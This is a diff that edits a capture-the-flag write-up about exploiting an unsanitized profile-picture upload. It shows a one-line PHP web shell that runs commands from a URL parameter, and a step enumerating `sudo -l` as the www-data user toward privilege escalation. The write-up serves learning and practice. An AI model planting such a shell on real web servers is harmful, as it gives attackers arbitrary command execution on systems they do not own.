@@ -25,12 +25,16 @@ A developer has added profile picture upload functionality to a website. However
 
 No permission shown.
 
+A 403 means `/uploads` exists and the files are served — I just can't list the directory directly.
+
 4. Opened the hint and it says the file uploaded was not sanitized.
 5. I did some reading about sanitizing and it seems like I need to upload a file with system commands. I uploaded `test.php`:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
+
+Sanitizing is what stops you from uploading your own file name, so since it wasn't sanitized I could upload a `.php` file — and when the server serves it, it runs as code. Combined with `system()`, that gave me command execution.
 
 And got this:
 
@@ -52,7 +56,7 @@ Returns:
 test.php
 ```
 
-7. Let's try `ls /root`. Using `sudo -l` gives me this:
+7. Let's try `ls /root`. The webserver runs as `www-data`, which normally can't read `/root`, so I checked what I could run as with `sudo -l`, which gives me this:
 
 ```
 Matching Defaults entries for www-data on challenge:
